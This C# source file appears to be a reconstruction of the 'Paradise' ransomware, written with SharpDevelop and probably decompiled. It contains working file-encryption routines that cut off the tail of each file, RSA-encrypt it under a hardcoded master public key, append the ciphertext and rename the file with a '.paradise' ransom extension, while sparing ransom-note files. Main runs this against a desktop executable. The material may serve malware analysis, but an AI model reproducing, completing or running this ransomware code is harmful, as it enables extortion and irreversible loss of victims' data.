/*
 * Created by SharpDevelop.
 * User: Adminuser
 * Date: 10/25/2017
 * Time: 3:32 PM
 * 
 * To change this template use Tools | Options | Coding | Edit Standard Headers.
 */
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Paradise
{
	class Program
	{
		public static string ID_Generator()
		{
			string text = "";
			Random random = new Random();
			while (text.Length < 8)
			{
				char c = (char)random.Next(33, 125);
				if (char.IsLetterOrDigit(c))
				{
					text += c;
				}
			}
			return text;
		}
		
		
		private static List<byte[]> GetPartOfFile(string fileName, int blocks_count)
		{
			List<byte[]> result;
			try
			{
				int num = blocks_count * 117;
				List<byte[]> list = new List<byte[]>();
				byte[] array = new byte[num];
				using (FileStream fileStream = File.OpenRead(fileName))
				{
					fileStream.Seek((long)(-(long)num), SeekOrigin.End);
					fileStream.Read(array, 0, num);
				}
				using (FileStream fileStream2 = File.OpenWrite(fileName))
				{
					fileStream2.SetLength(fileStream2.Length - (long)num);
				}
				int num2 = 0;
				for (int i = 0; i < blocks_count; i++)
				{
					byte[] array2 = new byte[117];
					for (int j = 0; j < 117; j++)
					{
						array2[j] = array[num2];
						num2++;
					}
					list.Add(array2);
				}
				result = list;
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}
		
		private static void EncryptFile(string file, RSACryptoServiceProvider ThRSA)
{
	try
	{
		FileInfo fileInfo = new FileInfo(file);
		if (fileInfo.Extension != ".paradise" && !fileInfo.FullName.Contains("#DECRYPT MY FILES#.txt") && fileInfo.Name != "id.dp")
		{
			List<byte[]> list = new List<byte[]>();
			List<byte> list2 = new List<byte>();
			if (fileInfo.Length / 1024L > 64L)
			{
				list = Program.GetPartOfFile(file, 547);
			}
			else
			{
				int blocks_count = Convert.ToInt32(fileInfo.Length / 117L);
				if (fileInfo.Length < 117L)
				{
					list.Add(File.ReadAllBytes(file));
					using (FileStream fileStream = File.OpenWrite(file))
					{
						fileStream.SetLength(0L);
						goto IL_C0;
					}
				}
				list = Program.GetPartOfFile(file, blocks_count);
			}
			IL_C0:
			if (list != null)
			{
				foreach (byte[] current in list)
				{
					byte[] collection = ThRSA.Encrypt(current, false);
					list2.AddRange(collection);
				}
				File.AppendAllText(file, "<CRYPTED>" + Convert.ToBase64String(list2.ToArray()) + "</CRYPTED>", Encoding.Default);
				File.Move(file, string.Concat(new string[]
				{
					file,
					"[id-",
					"your-id",
					"].[",
					"your-email",
					"].paradise"
				}));
				File.Delete(file);
			}
		}
	}
	catch (Exception)
	{
	}
}
		
		public static void Main(string[] args)
		{				
			string RSA_MasterPublic = "<RSAKeyValue><Modulus>maTp68zA8ho6MOEQI9k7s75JZIPu5mNBMD8O04ssgvcVrtZNoqqLbe0cB6wc+yF+sLeyxuPdylh/0hBDKIJT4BheadiDqN0vyU2TlOYelVnkCt/SCOlz14BJsQBqdA4TCyztl7ClmUuhkdglBeXbyu28nxl+SbYdceBojtyRtzE=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
			RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
			RSACryptoServiceProvider MasterRSA = new RSACryptoServiceProvider();
			RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
			string[] files = Directory.GetFiles(folderPath, "*.paradise", SearchOption.TopDirectoryOnly);
			string PCID = ID_Generator();
			string RSA_Public = rsa.ToXmlString(false);
			string RSA_Private = rsa.ToXmlString(true);
			MasterRSA.FromXmlString(RSA_MasterPublic);
			rsa.FromXmlString(RSA_Public);
			//Program.GetDrives();
			
			rSACryptoServiceProvider.FromXmlString(RSA_Public);
			EncryptFile(@"C:\Users\Adminuser\Desktop\Mlocker.exe", rSACryptoServiceProvider);
		}
	}
}